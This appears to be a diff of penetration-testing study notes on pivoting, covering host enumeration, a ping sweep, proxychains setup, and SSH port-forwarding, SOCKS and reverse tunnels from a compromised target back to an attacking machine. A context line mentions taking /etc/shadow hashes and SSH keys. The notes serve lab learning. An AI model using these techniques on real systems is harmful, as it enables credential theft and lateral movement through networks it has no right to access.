@@ -157,3 +157,87 @@ root
 #
 ```
 * with root access grab root password hash from /etc/shadow, grab SSH keys, chmod 600 file, test keys
+
+# Task 7 - Pivoting
+Pivoting uses access obtained on one machine to exploit another.  Example, exploit a public facing web server and then pivot to a db server
+
+# Task 8 - Pivoting Overview
+Some methods available for Pivoting are:
+* Tunneling/Proxying - create a proxy through a compromised host and route traffic to a target
+* Port Forwarding - create a connection between a local port and a single port on the target
+
+Good enumeration will determine what type of Pivot method to use
+
+# Task 9 - Pivoting Enumration
+Enumeration via a compromised host in order of preference
+* use material on the host
+  * arp -a
+  * /etc/hosts, /etc/resolv.conf
+* use pre-installed tools
+* use static compiled tools
+  * compiled tools that do not require dependencies
+* use live off the land techniques
+  * use bash scripting, example - ping sweep
+    ```
+    for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
+    ```
+* use local tools through a proxy
+
+# Task 10 - Proxychains & Foxyproxy
+Proxychains is a CLI tool that is used by prepending it to other commands
+* proxychains nc 1.2.3.4 23
+
+Proxychains reads the proxy port from the config file located in ./proxychains.conf, ~/.proxychains/proxychains.conf, or /etc/proxychains.conf in that order, this allows you to create a different proxy set for each engagement
+
+Example config
+```
+[ProxyList]
+socks4  127.0.0.1 1234
+```
+
+Proxychains can only be used for TCP scans, ICMP does not work, and it is extremely slow
+
+FoxyProxy is a web browser extension/addon for Chrome and Firefox.  It is used a lot in tandem with Burp Suite, etc, and is most useful when assessing a web based target.  Once the proxy is active, all browser traffic will redirect to the proxy configured
+
+# Task 11 - Pivoting with SSH tunnels and Port forwarding
+Using the SSH client
+
+Forwarding
+* a forward or "local" SSH tunnel
+* two methods
+  * port forwarding and proxying
+* port forwarding uses ssh -L, L links to a Local port
+  * example: ssh -L 8000:1.2.3.4:80 user@1.2.3.8 -fN
+    * -L links to a Local port which in this case is 8000
+    * 1.2.3.4:80 is what we are linking the Local port 8000 to
+    * user@1.2.3.8 is the host we have SSH access to
+    * -f backgrounds the shell
+    * -N doesn't execute commands
+* proxying uses ssh -D, D opens a local port for your proxy
+  * example: ssh -D 1234 user@1.2.3.8 -fN
+    * -D opens port 1234 for the proxy
+    * user@1.2.3.8 is the host we have SSH access to
+    * -f backgrounds the shell
+    * -N doesn't execute commands
+
+Reverse
+* used to access your attacking machine from the target
+* setup
+  * generate throwaway ssh keys with ssh-keygen on attack box
+  * copy public key, prefix it with
+    ```
+    command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
+    ```
+  * paste into authorized_keys on attack box
+  * copy private key to target
+* create a reverse connection with ssh -R
+  * connect to the host we have SSH access to, 1.2.3.8
+  * use ssh -R to create a reverse connection to another box
+  * ssh -R 8000:1.2.3.4:80 user@5.6.7.8 -i keyfile -fN
+    * -R creates the reverse connection
+    * 8000 is the local port on 1.2.3.8
+    * 1.2.3.4:80 is the other box you can reach from 1.2.3.8
+    * user@5.6.7.8 is your attacking machine
+    * -i to specify the private key
+    * -f backgrounds the shell
+    * -N doesn't execute commands
